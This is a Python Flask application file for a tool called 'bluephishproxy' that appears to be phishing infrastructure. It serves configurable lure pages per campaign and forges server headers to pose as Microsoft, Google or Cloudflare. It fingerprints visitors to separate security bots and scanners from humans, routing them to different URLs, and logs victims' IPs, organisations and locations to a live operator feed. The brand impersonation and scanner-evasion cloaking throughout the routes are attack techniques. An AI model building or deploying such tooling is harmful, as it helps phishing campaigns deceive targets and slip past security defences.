"""Flask application factory and routes.

Supports:
    - Campaign-based routing (/c/<campaign_id>/...)
    - Configurable lure templates per campaign
    - Real-time webhook notifications
    - Server-Sent Events live feed for operators
    - Operator REST API for campaign/visit management
    - Default catch-all for non-campaign links
"""

from __future__ import annotations

import json
import logging
import queue
import random
import uuid
from functools import wraps
from typing import Any

from flask import (
    Flask,
    Request,
    Response,
    make_response,
    redirect,
    request,
    session,
    jsonify,
    stream_with_context,
)
from werkzeug.middleware.proxy_fix import ProxyFix

from .campaigns import Campaign, create_campaign, delete_campaign, list_campaigns, load_campaign, save_campaign
from .config import Config
from .detection import build_visit_record, evaluate
from .lures import LURE_REGISTRY, list_templates, render_lure
from .storage import log_visit, save_visit, update_analytics
from .webhooks import notify

logger = logging.getLogger("bluephishproxy")

_sse_subscribers: list[queue.Queue[str]] = []

# --- Server header spoofing -----------------------------------------------

_SERVER_HEADERS: dict[str, list[dict[str, str]]] = {
    "microsoft": [
        {"Server": "Microsoft-IIS/10.0", "X-Powered-By": "ASP.NET",
         "X-AspNet-Version": "4.0.30319"},
        {"Server": "Microsoft-HTTPAPI/2.0", "X-Powered-By": "ARR/3.0"},
    ],
    "google": [
        {"Server": "gws", "X-XSS-Protection": "0"},
        {"Server": "ESF"},
    ],
    "cloudflare": [
        {"Server": "cloudflare", "CF-RAY": "dummy"},
    ],
    "generic": [
        {"Server": "nginx", "X-Content-Type-Options": "nosniff"},
        {"Server": "Apache/2.4", "X-Content-Type-Options": "nosniff"},
    ],
}


def _get_server_headers(brand: str) -> dict[str, str]:
    brand_key = brand.lower()
    for key, headers_list in _SERVER_HEADERS.items():
        if key in brand_key:
            base = random.choice(headers_list)
            break
    else:
        base = random.choice(_SERVER_HEADERS["generic"])

    return {
        **base,
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "SAMEORIGIN",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    }


def _apply_headers(response: Any, brand: str = "Microsoft") -> Any:
    for k, v in _get_server_headers(brand).items():
        response.headers[k] = v
    return response


def _extract_ip(req: Request) -> str:
    xff = req.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return req.remote_addr or "0.0.0.0"


def _broadcast_sse(record: dict[str, Any]) -> None:
    event_data = json.dumps({
        "event": "visit",
        "ip": record.get("ip_address"),
        "org": record.get("org"),
        "country": record.get("country"),
        "classification": record.get("classification"),
        "score": record.get("detection_score"),
        "vendor": record.get("vendor_name"),
        "path": record.get("path"),
        "campaign_id": record.get("campaign_id", "default"),
        "session_id": record.get("session_id"),
        "timestamp": record.get("timestamp"),
        "browser": record.get("browser"),
        "os": record.get("os"),
        "top_signal": record.get("top_signal"),
    }, default=str)
    msg = f"data: {event_data}\n\n"
    dead: list[queue.Queue[str]] = []
    for q in _sse_subscribers:
        try:
            q.put_nowait(msg)
        except queue.Full:
            dead.append(q)
    for q in dead:
        try:
            _sse_subscribers.remove(q)
        except ValueError:
            pass


def _require_operator(cfg: Config):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            if cfg.operator_token:
                auth = request.headers.get("Authorization", "")
                token = request.args.get("token", "")
                if not (auth == f"Bearer {cfg.operator_token}" or token == cfg.operator_token):
                    return jsonify({"error": "unauthorized"}), 401
            return f(*args, **kwargs)
        return wrapper
    return decorator


def _process_visit(
    cfg: Config,
    campaign: Campaign | None = None,
) -> dict[str, Any]:
    session_id = request.cookies.get("csession", str(uuid.uuid4()))
    ip = _extract_ip(request)
    ua = request.headers.get("User-Agent", "")
    headers = dict(request.headers)
    js_metrics: dict[str, Any] | None = session.get("adv_metrics")
    elapsed_ms: float | None = session.get("metrics_ts")

    record = build_visit_record(
        ip=ip,
        user_agent=ua,
        headers=headers,
        cookies=dict(request.cookies),
        path=request.path,
        method=request.method,
        args=dict(request.args),
        referrer=request.referrer,
        session_id=session_id,
        js_metrics=js_metrics,
        elapsed_ms=elapsed_ms,
        cfg=cfg,
    )

    if campaign:
        record["campaign_id"] = campaign.id
        record["campaign_name"] = campaign.name
        record["template"] = campaign.template

    log_visit(record)
    save_visit(record, cfg)
    update_analytics(record, cfg)

    notify(record, cfg)
    _broadcast_sse(record)

    return record


def create_app(cfg: Config | None = None) -> Flask:
    if cfg is None:
        cfg = Config()

    app = Flask(__name__)

    if cfg.secret_key_is_ephemeral:
        logger.warning(
            "BPP_SECRET_KEY is not set — generating ephemeral key. "
            "Session cookies will not survive restarts."
        )
    app.secret_key = cfg.resolved_secret_key()

    app.wsgi_app = ProxyFix(  # type: ignore[assignment]
        app.wsgi_app,
        x_for=cfg.trusted_proxies,
        x_host=cfg.trusted_proxies,
    )

    cfg.data_dir.mkdir(parents=True, exist_ok=True)
    cfg.analytics_dir.mkdir(parents=True, exist_ok=True)

    # ==================================================================
    # Internal endpoints (used by lure templates)
    # ==================================================================

    @app.route("/_bpp/collect", methods=["POST"])
    def collect_metrics():  # type: ignore[return]
        data: dict[str, Any] = request.json or {}
        session["adv_metrics"] = data
        session["metrics_ts"] = data.get("elapsed")
        resp = jsonify({"status": "ok"})
        return _apply_headers(resp, cfg.brand_name)

    @app.route("/_bpp/gate")
    def gate_redirect():  # type: ignore[return]
        campaign_id = session.get("campaign_id")
        campaign = load_campaign(campaign_id, cfg) if campaign_id else None
        record = _process_visit(cfg, campaign)
        classification = record.get("classification", "clean")
        session_id = record.get("session_id", str(uuid.uuid4()))

        safe_url = (campaign.safe_redirect_url if campaign else cfg.safe_redirect_url)
        flagged_url = (campaign.flagged_redirect_url if campaign else cfg.flagged_redirect_url)

        if classification == "bot":
            resp = redirect(flagged_url, code=302)
        elif classification == "suspicious":
            resp = redirect(flagged_url, code=302)
        else:
            resp = redirect(safe_url, code=302)

        brand = campaign.brand_name if campaign else cfg.brand_name
        resp = _apply_headers(resp, brand)
        resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
        return resp

    # legacy endpoint compatibility
    @app.route("/api/v2/metrics/collect", methods=["POST"])
    def collect_metrics_legacy():  # type: ignore[return]
        return collect_metrics()

    @app.route("/api/v2/metrics/usr")
    @app.route("/scanning_page")
    def scan_page_legacy():  # type: ignore[return]
        html = render_lure(cfg.default_template, {"brand": cfg.brand_name})
        resp = make_response(html)
        return _apply_headers(resp, cfg.brand_name)

    # ==================================================================
    # Campaign routes: /c/<campaign_id>/...
    # ==================================================================

    @app.route("/c/<campaign_id>/", defaults={"path": ""})
    @app.route("/c/<campaign_id>/<path:path>")
    def campaign_entry(campaign_id: str, path: str):  # type: ignore[return]
        campaign = load_campaign(campaign_id, cfg)
        if not campaign or not campaign.active:
            return make_response("Not Found", 404)

        session["campaign_id"] = campaign_id

        js_metrics = session.get("adv_metrics")
        if not js_metrics:
            html = render_lure(campaign.template, {
                "brand": campaign.brand_name,
                **campaign.custom_params,
            })
            resp = make_response(html)
            resp = _apply_headers(resp, campaign.brand_name)
            session_id = request.cookies.get("csession", str(uuid.uuid4()))
            resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)

            record = _process_visit(cfg, campaign)
            return resp

        record = _process_visit(cfg, campaign)
        classification = record.get("classification", "clean")

        if classification == "bot":
            resp = redirect(campaign.flagged_redirect_url, code=302)
        elif classification == "suspicious":
            resp = redirect(campaign.flagged_redirect_url, code=302)
        else:
            resp = redirect(campaign.safe_redirect_url, code=302)

        resp = _apply_headers(resp, campaign.brand_name)
        session_id = record.get("session_id", str(uuid.uuid4()))
        resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
        return resp

    # ==================================================================
    # Operator API
    # ==================================================================

    @app.route("/api/operator/campaigns", methods=["GET"])
    @_require_operator(cfg)
    def api_list_campaigns():  # type: ignore[return]
        campaigns = list_campaigns(cfg)
        return jsonify([{
            "id": c.id, "name": c.name, "template": c.template,
            "active": c.active, "created_at": c.created_at,
            "brand_name": c.brand_name,
            "safe_redirect_url": c.safe_redirect_url,
            "description": c.description,
        } for c in campaigns])

    @app.route("/api/operator/campaigns", methods=["POST"])
    @_require_operator(cfg)
    def api_create_campaign():  # type: ignore[return]
        data = request.json or {}
        name = data.get("name", "Unnamed Campaign")
        template = data.get("template", cfg.default_template)
        if template not in LURE_REGISTRY:
            return jsonify({"error": f"Unknown template: {template}",
                            "available": list(LURE_REGISTRY.keys())}), 400
        c = create_campaign(
            name=name,
            template=template,
            cfg=cfg,
            safe_redirect_url=data.get("safe_redirect_url", ""),
            flagged_redirect_url=data.get("flagged_redirect_url", ""),
            brand_name=data.get("brand_name", ""),
            description=data.get("description", ""),
            custom_params=data.get("custom_params"),
        )
        return jsonify({"id": c.id, "name": c.name, "url": f"/c/{c.id}/"}), 201

    @app.route("/api/operator/campaigns/<campaign_id>", methods=["GET"])
    @_require_operator(cfg)
    def api_get_campaign(campaign_id: str):  # type: ignore[return]
        c = load_campaign(campaign_id, cfg)
        if not c:
            return jsonify({"error": "not found"}), 404
        from dataclasses import asdict
        return jsonify(asdict(c))

    @app.route("/api/operator/campaigns/<campaign_id>", methods=["PUT"])
    @_require_operator(cfg)
    def api_update_campaign(campaign_id: str):  # type: ignore[return]
        c = load_campaign(campaign_id, cfg)
        if not c:
            return jsonify({"error": "not found"}), 404
        data = request.json or {}
        for field in ("name", "template", "active", "safe_redirect_url",
                      "flagged_redirect_url", "brand_name", "description"):
            if field in data:
                setattr(c, field, data[field])
        if "custom_params" in data:
            c.custom_params = data["custom_params"]
        save_campaign(c, cfg)
        return jsonify({"id": c.id, "status": "updated"})

    @app.route("/api/operator/campaigns/<campaign_id>", methods=["DELETE"])
    @_require_operator(cfg)
    def api_delete_campaign(campaign_id: str):  # type: ignore[return]
        if delete_campaign(campaign_id, cfg):
            return jsonify({"status": "deleted"})
        return jsonify({"error": "not found"}), 404

    @app.route("/api/operator/templates", methods=["GET"])
    @_require_operator(cfg)
    def api_list_templates():  # type: ignore[return]
        return jsonify(list_templates())

    @app.route("/api/operator/templates/<template_id>/preview", methods=["GET"])
    @_require_operator(cfg)
    def api_preview_template(template_id: str):  # type: ignore[return]
        if template_id not in LURE_REGISTRY:
            return jsonify({"error": "not found"}), 404
        params = dict(request.args)
        params.setdefault("brand", cfg.brand_name)
        html = render_lure(template_id, params)
        return make_response(html)

    @app.route("/api/operator/visits", methods=["GET"])
    @_require_operator(cfg)
    def api_list_visits():  # type: ignore[return]
        limit = int(request.args.get("limit", "50"))
        campaign_filter = request.args.get("campaign_id")
        classification_filter = request.args.get("classification")

        visits: list[dict[str, Any]] = []
        if cfg.data_dir.exists():
            files = sorted(cfg.data_dir.glob("*.json"), reverse=True)
            for f in files:
                if len(visits) >= limit:
                    break
                try:
                    rec = json.loads(f.read_text())
                    if campaign_filter and rec.get("campaign_id") != campaign_filter:
                        continue
                    if classification_filter and rec.get("classification") != classification_filter:
                        continue
                    visits.append({
                        "ip_address": rec.get("ip_address"),
                        "org": rec.get("org"),
                        "country": rec.get("country"),
                        "classification": rec.get("classification"),
                        "detection_score": rec.get("detection_score"),
                        "vendor_name": rec.get("vendor_name"),
                        "path": rec.get("path"),
                        "campaign_id": rec.get("campaign_id"),
                        "session_id": rec.get("session_id"),
                        "timestamp": rec.get("timestamp"),
                        "browser": rec.get("browser"),
                        "os": rec.get("os"),
                        "top_signal": rec.get("top_signal"),
                        "user_agent": rec.get("user_agent"),
                    })
                except (json.JSONDecodeError, OSError):
                    continue
        return jsonify(visits)

    @app.route("/api/operator/visits/<session_id>", methods=["GET"])
    @_require_operator(cfg)
    def api_get_visit(session_id: str):  # type: ignore[return]
        if cfg.data_dir.exists():
            for f in cfg.data_dir.glob(f"{session_id}-*.json"):
                try:
                    return jsonify(json.loads(f.read_text()))
                except (json.JSONDecodeError, OSError):
                    continue
        return jsonify({"error": "not found"}), 404

    @app.route("/api/operator/analytics", methods=["GET"])
    @_require_operator(cfg)
    def api_analytics():  # type: ignore[return]
        from .reporting import generate_markdown
        fmt = request.args.get("format", "json")
        if fmt == "markdown":
            return make_response(generate_markdown(cfg))
        analytics_files = sorted(cfg.analytics_dir.glob("daily-*.json"), reverse=True)
        results = []
        for f in analytics_files[:30]:
            try:
                results.append(json.loads(f.read_text()))
            except (json.JSONDecodeError, OSError):
                continue
        return jsonify(results)

    # ==================================================================
    # SSE live feed
    # ==================================================================

    @app.route("/api/operator/feed")
    @_require_operator(cfg)
    def sse_feed():  # type: ignore[return]
        def stream():
            q: queue.Queue[str] = queue.Queue(maxsize=100)
            _sse_subscribers.append(q)
            try:
                yield "data: {\"event\": \"connected\"}\n\n"
                while True:
                    try:
                        msg = q.get(timeout=30)
                        yield msg
                    except queue.Empty:
                        yield ": keepalive\n\n"
            except GeneratorExit:
                pass
            finally:
                try:
                    _sse_subscribers.remove(q)
                except ValueError:
                    pass

        return Response(
            stream_with_context(stream()),
            mimetype="text/event-stream",
            headers={
                "Cache-Control": "no-cache",
                "X-Accel-Buffering": "no",
                "Connection": "keep-alive",
            },
        )

    # ==================================================================
    # Operator dashboard
    # ==================================================================

    @app.route("/api/operator/dashboard")
    @_require_operator(cfg)
    def operator_dashboard():  # type: ignore[return]
        from .dashboard import dashboard_html
        resp = make_response(dashboard_html(cfg))
        resp.content_type = "text/html; charset=utf-8"
        return resp

    # ==================================================================
    # Default catch-all (non-campaign links)
    # ==================================================================

    @app.route("/", defaults={"uri": ""})
    @app.route("/<path:uri>")
    def catch_all(uri: str):  # type: ignore[return]
        session_id = request.cookies.get("csession", str(uuid.uuid4()))
        js_metrics = session.get("adv_metrics")

        if not js_metrics:
            html = render_lure(cfg.default_template, {"brand": cfg.brand_name})
            resp = make_response(html)
            resp = _apply_headers(resp, cfg.brand_name)
            resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)

            record = _process_visit(cfg)
            return resp

        record = _process_visit(cfg)
        classification = record.get("classification", "clean")

        if classification == "bot":
            resp = redirect(cfg.flagged_redirect_url, code=302)
        elif classification == "suspicious":
            resp = redirect(cfg.flagged_redirect_url, code=302)
        else:
            resp = redirect(cfg.safe_redirect_url, code=302)

        resp = _apply_headers(resp, cfg.brand_name)
        resp.set_cookie("csession", session_id, max_age=cfg.session_max_age)
        return resp

    return app
